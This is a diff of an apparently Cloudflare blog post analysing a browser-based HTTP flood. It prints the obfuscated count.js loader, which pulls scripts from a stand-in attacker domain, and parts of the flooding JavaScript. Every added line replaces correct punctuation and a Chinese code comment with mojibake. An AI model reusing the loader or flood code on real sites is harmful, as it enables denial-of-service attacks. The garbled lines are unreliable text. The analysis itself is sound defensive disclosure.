@@ -21,18 +21,18 @@ id=datadatadasssssssssssssssssssssssssssssssssssssssssssasssssssssssssssssssssss
 </code></pre>
 	<p>We received millions of similar requests, clearly suggesting a flood. Let's take a deeper look at this request.</p>
 	<p>First, let's note that the headers look legitimate. We often see floods issued by Python or Ruby scripts, with weird <code>Accept-Language</code> or <code>User-Agent</code> headers. But this one doesn't look like it. This request is a proper request issued by a real browser.</p>
-	<p>Next, notice the request is a <code>POST</code> and contains an <code>Origin</code> header — it was issued by an Ajax (XHR) cross origin call.</p>
+	<p>Next, notice the request is a <code>POST</code> and contains an <code>Origin</code> header â€” it was issued by an Ajax (XHR) cross origin call.</p>
 	<p>Finally, the <code>Referer</code> points to the website which was issuing these queries against our servers. We checked: the URL was correct and the site was reachable.</p>
 	<h3 id="browserbasedfloods">Browser-based floods</h3>
 	<p><img src="https://blog.cloudflare.com/content/images/2015/09/attack.jpg" alt="" loading="lazy"></p>
 	<p>Browser-based L7 floods have been rumored as a theoretical threat for a long time. Read <a href="https://blog.cloudflare.com/an-introduction-to-javascript-based-ddos">Nick Sullivan's explanation</a> on how they work.</p>
 	<p>One of the early mentions was in 2010, when Lavakumar Kuppan proposed abusing <a href="https://media.blackhat.com/bh-ad-10/Kuppan/Blackhat-AD-2010-Kuppan-Attacking-with-HTML5-wp.pdf">browser HTML5 features</a> for DoS. Then <a href="https://media.blackhat.com/us-13/us-13-Grossman-Million-Browser-Botnet.pdf">in 2013 Jeremiah Grossman and Matt Johansen</a> suggested web advertisements as a distribution vector for the malicious JavaScript. A paper from this year discussed <a href="http://www.christian-rossow.de/publications/cashcannon-woot2015.pdf">a theoretical cost</a> of such an attack.</p>
 	<p>Finally, in April it was reported that the <a href="https://citizenlab.org/wp-content/uploads/2009/10/ChinasGreatCannon.pdf">Great Cannon</a> distributing JavaScript with a novel method - by injecting raw TCP segments into passing by connections. And just this week a <a href="https://imgur.com/blog/2015/09/22/imgur-vulnerability-patched">flaw</a> popular image hosting site was used to attack another site.</p>
-	<p>It seems the biggest difficulty is not in creating the JavaScript — it is in effectively distributing it. Since an efficient distribution vector is crucial in issuing large floods, up until now I haven't seen many sizable browser-based floods.</p>
-	<p>This is what made the flood described above interesting — it was pretty large, peaking at over 275,000 HTTP requests per second.</p>
+	<p>It seems the biggest difficulty is not in creating the JavaScript â€” it is in effectively distributing it. Since an efficient distribution vector is crucial in issuing large floods, up until now I haven't seen many sizable browser-based floods.</p>
+	<p>This is what made the flood described above interesting â€” it was pretty large, peaking at over 275,000 HTTP requests per second.</p>
 	<h3 id="theattackpage">The attack page</h3>
 	<p>To investigate the source of the flood we followed the <code>Referer</code> header. It was an exciting journey.</p>
-	<p>The web page from the <code>Referer</code> looked like a link farm or an ad aggregator — imagine a couple of dozen blinking and shouting banners centrally on a page, nothing more. For this discussion, let's call this page "the attack site". The page was written in basic HTML and used a couple of simple JavaScript routines. It loaded three small JavaScript files, one of them was called <code>count.js</code>. It contained some not notable <code>document.write</code> statements, followed by 50 new lines and this obfuscated code:</p>
+	<p>The web page from the <code>Referer</code> looked like a link farm or an ad aggregator â€” imagine a couple of dozen blinking and shouting banners centrally on a page, nothing more. For this discussion, let's call this page "the attack site". The page was written in basic HTML and used a couple of simple JavaScript routines. It loaded three small JavaScript files, one of them was called <code>count.js</code>. It contained some not notable <code>document.write</code> statements, followed by 50 new lines and this obfuscated code:</p>
 	<pre><code class="language-.txt">eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[0-8]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2.3("&lt;0 4=\\"5://6.anotherattacksite.7/8/1/jquery2.1\\"&gt;&lt;/0&gt;");2.3("&lt;0 4=\\"5://6.anotherattacksite.7/8/1/jquery1.1\\"&gt;&lt;/0&gt;");',[],9,'script|js|document|writeln|src|http|www|com|css'.split('|'),0,{}))
 </code></pre>
 	<p>Pasting it to <a href="http://jsbeautifier.org">Js Beautifier</a> revealed the following:</p>
@@ -56,7 +56,7 @@ function r_send() {
     setTimeout("post_send()", 50);
 }
 
-if(!+[1,]) { //IE下不执行。
+if(!+[1,]) { //IEä¸‹ä¸æ‰§è¡Œã€‚
     var fghj=1;
 } else {
     setTimeout("post_send()", 3000);
@@ -72,7 +72,7 @@ if(!+[1,]) { //IE下不执行。
 	<pre><code>99.8% China
  0.2% other
 </code></pre>
-	<p>Our system is able to extract the device type from the user agent — 80% of the requests came from mobile devices:</p>
+	<p>Our system is able to extract the device type from the user agent â€” 80% of the requests came from mobile devices:</p>
 	<pre><code>72% mobile
 23% desktop
  5% tablet
@@ -108,7 +108,7 @@ Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; MI 3 Build/KTU84P) AppleWebKit/534.
 		<li>Either the third-party website was the "attack page", or it forwarded the user to an "attack page".</li>
 		<li>The user was served an attack page containing a malicious JavaScript which launched a flood of XHR requests against CloudFlare servers.</li>
 	</ul>
-	<p>Attacks like this form a new trend. They present a great danger in the internet — defending against this type of flood is not easy for small website operators. The good news is CloudFlare handles these attacks easily and automatically without the flood of HTTP requests ever hitting our customers' infrastructure.</p>
-	<p>While it’s still early days of our research, we hope publicizing the details will help to advance public knowledge and, hopefully, help others affected.</p>
+	<p>Attacks like this form a new trend. They present a great danger in the internet â€” defending against this type of flood is not easy for small website operators. The good news is CloudFlare handles these attacks easily and automatically without the flood of HTTP requests ever hitting our customers' infrastructure.</p>
+	<p>While itâ€™s still early days of our research, we hope publicizing the details will help to advance public knowledge and, hopefully, help others affected.</p>
 	<!--kg-card-end: markdown-->
 </div>
